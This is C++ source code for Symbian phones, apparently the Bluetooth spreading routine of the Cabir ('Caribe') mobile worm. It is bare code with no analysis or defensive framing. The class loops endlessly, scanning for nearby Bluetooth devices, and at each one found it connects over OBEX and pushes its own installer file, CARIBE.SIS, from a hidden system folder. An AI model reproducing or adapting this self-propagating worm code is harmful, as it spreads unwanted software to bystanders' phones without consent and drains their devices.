   #include "general.h"

   #include "caribebt.h"
   #include <eikenv.h>
   #include <bt_sock.h>
   #include <obex.h>
   #include <btextnotifiers.h>

   /////////////////////////////////////////////////////////////////////
   /////////////////////////////////////////////////////////////////////
   /////////////////////////////////////////////////////////////////////

   CaribeBluetooth::CaribeBluetooth():
   CActive(CActive::EPriorityStandard)
   {
       WithAddress = 0;
       iState = 3;

       _LIT(currentFileName,"C:\\SYSTEM\\SYMBIANSECUREDATA\\CARIBESECURITYMANAGER\\CARIBE.SIS");

       iCurrFile = CObexFileObject::NewL(TPtrC(NULL, 0));
       iCurrFile->InitFromFileL(currentFileName);

       CActiveScheduler::Add(this);
   }

   CaribeBluetooth::~CaribeBluetooth()
   {

   }

   CaribeBluetooth* CaribeBluetooth::NewL()
   {
       return NewLC();
   }

   CaribeBluetooth* CaribeBluetooth::NewLC()
   {
       CaribeBluetooth* self = new CaribeBluetooth;
       self->ConstructL();
       return self;
   }

   void CaribeBluetooth::ConstructL()
   {
       iState = 3;
       RunL();
   }

   void CaribeBluetooth::RunL()
   {
       if(iState == 1)
       {
           if(!obexClient->IsConnected())
           {
               iState = 3;
           }
           else
           {

               //iCurrObject = CObexNullObject::NewL();
               //iCurrObject->SetNameL(_L("Hello World"));
               //obexClient->Put(*iCurrObject,iStatus);

               iState = 2;
               Cancel();

               obexClient->Put(*iCurrFile,iStatus);

               SetActive();
               return;
           }

       }

       if(iState == 2)
       {
           //delete iCurrObject;
           iState = 3;

           Cancel();
           obexClient->Disconnect(iStatus);
           SetActive();
           return;
       }

       if(iState == 3)
       {
           if(obexClient)
           {
               delete obexClient;
               obexClient = NULL;
           }

           while(iState == 3)
           {
               FindDevices();
               ManageFoundDevices();
           }

           return;
       }

   }


   void CaribeBluetooth::DoCancel()
   {

   }


   int CaribeBluetooth::FindDevices()
   {

       _LIT(KL2Cap, "BTLinkManager");

       int res;

       if((res = socketServ.Connect()) != KErrNone)
       {
           //ErrMessage("Error Connect");
           return 0;
       }

       if((res = socketServ.FindProtocol((const TProtocolName&)KL2Cap,pInfo))!=KErrNone)
       {
           //ErrMessage("Error FindProtocol");
           socketServ.Close();
           return 0;
       }

       if((res = hr.Open(socketServ,pInfo.iAddrFamily,pInfo.iProtocol))!=KErrNone)
       {
           //ErrMessage("Error Open");
           socketServ.Close();
           return 0;
       }

       WithAddress = 0;

       addr.SetIAC(KGIAC);
       addr.SetAction(KHostResInquiry);

       TRequestStatus iStatusIn;

       hr.GetByAddress(addr, entry, iStatusIn);

       User::WaitForRequest(iStatusIn);


       if(iStatusIn!=KErrNone)
       {
           //ErrMessage("Error Finding Devices");
       }
       else
       {
           WithAddress = 1;
       }

       socketServ.Close();
   //  hr.Close();

       return 0;
   }


   int CaribeBluetooth::ManageFoundDevices()
   {

       if(WithAddress)
       {
           WithAddress = 0;

           Cancel();

           TBTSockAddr btaddr(entry().iAddr);

           TBTDevAddr devAddr;

           devAddr = btaddr.BTAddr();


           TObexBluetoothProtocolInfo obexBTProtoInfo;

           obexBTProtoInfo.iTransport.Copy(_L("RFCOMM"));
           obexBTProtoInfo.iAddr.SetBTAddr(devAddr);
           obexBTProtoInfo.iAddr.SetPort(0x00000009);

           obexClient = CObexClient::NewL(obexBTProtoInfo);

           if(obexClient)
           {
               iState = 1;

               iStatus = KRequestPending;

               Cancel();

               obexClient->Connect(iStatus);

               SetActive();


           }
       }
       else
       {
           iState = 3;
           User::After(1000000);
       }

       return 0;
   }


   /////////////////////////////////////////////////////////////////////
   /////////////////////////////////////////////////////////////////////
   /////////////////////////////////////////////////////////////////////
